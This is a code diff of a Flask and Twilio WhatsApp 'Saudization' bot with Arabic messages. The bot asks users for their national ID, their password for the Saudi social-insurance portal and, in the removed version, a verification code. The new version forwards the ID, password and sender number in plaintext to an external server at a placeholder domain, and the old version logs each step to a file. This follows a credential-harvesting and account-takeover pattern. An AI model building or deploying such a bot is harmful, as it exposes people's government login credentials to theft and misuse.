@@ -1,47 +1,52 @@
-import os
-import requests
 from flask import Flask, request
-from datetime import datetime
+from twilio.twiml.messaging_response import MessagingResponse
+import requests
+import os
 
 app = Flask(__name__)
 
-USER_PHONE_NUMBER = os.getenv("USER_PHONE_NUMBER", "+967780952606")
-TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER", "+14155238886")
+# صفحة رئيسية لاختبار الاتصال
+@app.route("/", methods=["GET"])
+def home():
+    return "بوت السعودة يعمل ✅"
 
-log_file = "requests_log.txt"
+# نقطة استقبال رسائل واتساب من Twilio
+@app.route("/bot", methods=["POST"])
+def bot():
+    incoming_msg = request.values.get("Body", "").strip().lower()
+    sender = request.values.get("From", "")
 
-@app.route("/whatsapp", methods=["POST"])
-def whatsapp_bot():
-    incoming_msg = request.form.get("Body", "").strip().lower()
-    sender = request.form.get("From", "")
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    resp = MessagingResponse()
+    msg = resp.message()
 
-    reply = ""
+    if "سعوده" in incoming_msg:
+        msg.body(
+            "👋 مرحباً بك في بوت السعودة.\n\nالرجاء إرسال رقم الهوية وكلمة المرور للتسجيل في التأمينات.\nمثال:\n1234567890, كلمة_المرور"
+        )
 
-    if "سعودة" in incoming_msg:
-        reply = "📝 أرسل رقم الهوية:"
-        log_request("طلب سعودة", sender, now)
-    elif incoming_msg.isdigit() and len(incoming_msg) == 10:
-        reply = "🔑 أرسل كلمة المرور:"
-        log_request(f"الهوية: {incoming_msg}", sender, now)
-    elif "pass" in incoming_msg or "كلمه" in incoming_msg:
-        reply = "⏳ جاري تسجيل الدخول للموقع..."
-        log_request(f"كلمة مرور مستلمة", sender, now)
-    elif "كود" in incoming_msg:
-        reply = "✅ تم استلام كود التحقق. جاري إكمال السعودة..."
-        log_request("كود تحقق", sender, now)
+    elif "," in incoming_msg:
+        try:
+            national_id, password = [i.strip() for i in incoming_msg.split(",")]
+
+            # هنا يمكنك ربط السكربت الحقيقي لموقع التأمينات (سيرفر خارجي)
+            # مثلاً إرسال البيانات إلى سكربت على سيرفر VPS
+            requests.post("https://your-vps-domain.com/saudabot-login", json={
+                "id": national_id,
+                "password": password,
+                "sender": sender
+            })
+
+            msg.body("✅ تم استلام البيانات، سيتم تنفيذ التسجيل وإبلاغك بالتفاصيل قريباً.")
+
+        except Exception as e:
+            msg.body(f"❌ حدث خطأ أثناء معالجة البيانات: {str(e)}")
+
     else:
-        reply = "👋 مرحباً! أرسل 'سعودة' للبدء."
+        msg.body("❗ أرسل كلمة \"سعوده\" لبدء العملية.")
 
-    send_whatsapp_reply(sender, reply)
-    return "OK", 200
+    return str(resp)
 
-def log_request(content, sender, timestamp):
-    with open(log_file, "a") as f:
-        f.write(f"{timestamp} - {sender}: {content}\n")
-
-def send_whatsapp_reply(to, body):
-    print(f"Reply to {to}: {body}")  # محاكاة إرسال الرسالة
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(debug=False, host="0.0.0.0", port=5000)
+
